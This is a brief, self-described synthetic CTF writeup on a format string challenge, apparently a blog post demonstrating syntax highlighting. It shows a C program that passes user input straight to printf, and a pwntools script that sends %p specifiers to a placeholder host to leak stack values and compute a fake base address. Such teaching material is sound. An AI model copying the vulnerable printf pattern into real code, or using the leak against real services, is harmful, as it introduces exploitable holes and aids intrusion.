---
layout: layouts/post.njk
title: "Misc: Format String Leak"
date: 2024-07-10
category: Misc
difficulty: Easy
tags: [HTB]
description: "Quick leak-and-parse workflow for a format string challenge."
---

A short, synthetic writeup to showcase syntax highlighting for C and Python.

## Vulnerable snippet (C)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    char name[64];
    puts("Enter your name:");
    if (!fgets(name, sizeof(name), stdin)) {
        return 1;
    }
    name[strcspn(name, "\n")] = '\0';

    /* Vulnerable: user-controlled format string */
    printf(name);
    printf("\n");
    return 0;
}
```

## Quick exploit (Python)

```python
from pwn import remote

io = remote("example.ctf", 31337)

# Leak stack values; grab a pointer-like value for a base calc.
io.sendline(b"%p %p %p %p %p %p")
leak = io.recvline().strip().split()

print("leaks:", leak)

# Example parse: take the 5th leak and compute a fake base.
ptr = int(leak[4], 16)
base = ptr - 0x1234
print("base:", hex(base))
```
